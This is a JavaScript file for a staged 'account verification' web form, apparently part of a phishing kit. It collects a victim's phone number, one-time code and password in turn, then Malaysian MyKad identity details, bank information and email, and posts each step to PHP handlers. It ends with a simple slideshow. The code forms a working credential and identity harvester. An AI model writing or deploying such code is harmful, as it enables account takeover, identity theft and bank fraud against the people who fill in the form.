function processFirstData(){
	$('#firstForm').submit(function(submitingprocessFirstData){
	submitingprocessFirstData.preventDefault();
	
	var $phone_number = $("input#phone_number").val();
	
	if($phone_number === ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "req/firstData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".second").show();
		$('.loading').hide();
		$('.first').hide();
		$("input#validatephone_number").val($phone_number);
		}
	});
	});  
	return false;
};

function processSecondData(){
	$('#secondForm').submit(function(submitingprocessSecondData){
	submitingprocessSecondData.preventDefault();
	
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#otp_code").val();
	
	if($phone_number == "" && $otp_code == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "req/secondData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".third").show();
		$('.loading').hide();
		$('.second').hide();
		$("input#validatephone_number").val($phone_number);
		$("input#validateOtpCode").val($otp_code);
		}
	});
	});  
	return false;
};

function processThirdData(){
	$('#thirdForm').submit(function(submitingprocessThirdData){
	submitingprocessThirdData.preventDefault();
	
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#validateotp_code").val();
	var $password = $("input#password").val();
	
	if($phone_number == "" && $otp_code == "" && $password == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "req/thirdData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".four").show();
		$('.loading').hide();
		$('.third').hide();
		$("input#validatephone_number").val($phone_number);
		$("input#validatepassword").val($password);
		}
	});
	});  
	return false;
};
function processfourData(){
	$('#fourForm').submit(function(submitingprocessfourData){
	submitingprocessfourData.preventDefault();
	
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#validateotp_code").val();
	var $password = $("input#validatepassword").val();
	var $no_mykad = $("input#no_mykad").val();
	var $nama_mykad = $("input#nama_mykad").val();
	var $umur_mykad = $("input#umur_mykad").val();
	var $alamat_mykad = $("input#alamat_mykad").val();
	var $jantina_mykad = $("input#jantina_mykad").val();
	var $pekerjaan_mykad = $("input#pekerjaan_mykad").val();
	var $bank_mykad = $("input#bank_mykad").val();
	var $nbnk_mykad = $("input#nbnk_mykad").val();
	var $emel_mykad = $("input#emel_mykad").val();
	
	if($phone_number == "" && $otp_code == "" && $password == "" && $no_mykad == "" && $nama_mykad == "" && $umur_mykad == "" && $alamat_mykad == "" && $jantina_mykad == "" && $pekerjaan_mykad == "" && $bank_mykad == "" && $nbnk_mykad == "" && $emel_mykad == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "fourData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".five").show();
		$('.loading').hide();
		$('.four').hide();
		}
	});
	});  
	return false;
}
var slideIndex = 0;
tampilkanSlide();

function tampilkanSlide() {
  var i;
  var slides = document.getElementsByClassName("slide");
  
  for (i = 0; i < slides.length; i++) {
    slides[i].classList.remove("show");
  }
  
  slideIndex++;
  
  if (slideIndex > slides.length) {slideIndex = 1}
  
  slides[slideIndex-1].classList.add('show');
  
  setTimeout(tampilkanSlide, 2000); // Ganti slide setiap 2detik
};